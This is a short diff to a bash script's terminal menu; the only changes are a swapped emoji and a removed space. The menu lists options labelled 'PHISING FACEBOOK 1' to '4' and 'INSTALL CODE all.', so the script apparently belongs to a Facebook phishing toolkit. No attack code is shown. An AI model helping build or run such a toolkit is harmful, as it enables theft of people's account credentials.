@@ -40,10 +40,10 @@ echo $i"────────────────────────
 echo $i"|"$me"14"$i" |"$cy" PHISING FACEBOOK 1       "$i"|"$i"    |"$cy" P"$i" |"
 echo $i"|"$me"15"$i" |"$cy" PHISING FACEBOOK 2       "$i"|"$i"    ─────"
 echo $i"|"$me"16"$i" |"$cy" PHISING FACEBOOK 3       "$i"|"$i"    |"$cy" Y"$i" |"
-echo $i"|"$me"17"$i" |"$cy" PHISING FACEBOOK 4       "$i"|"$i"    |"$cy" 😁"$i" |"
+echo $i"|"$me"17"$i" |"$cy" PHISING FACEBOOK 4       "$i"|"$i"    |"$cy" 🤐"$i" |"
 echo $i"────────────────────────────────"$i"    |"$cy" S"$i" |"
 echo $i"|"$me"18"$i" |"$cy" INSTALL CODE all.        "$i"|"$i"    |"$cy" N"$i" |"
-echo $i"|"$me"19"$i" |"$cy" OUT.   /EXIT PROGRAM      "$i"|"$i"    |"$cy" B"$i" |"
+echo $i"|"$me"19"$i" |"$cy" OUT.   /EXIT PROGRAM     "$i"|"$i"    |"$cy" B"$i" |"
 echo $i"────────────────────────────────    ─────"
 echo
 echo $me"┌==="$bi"["$i"FR64645"$bi"]"$me"======"$bi"["$i""SHEHAN        ""$bi"]"
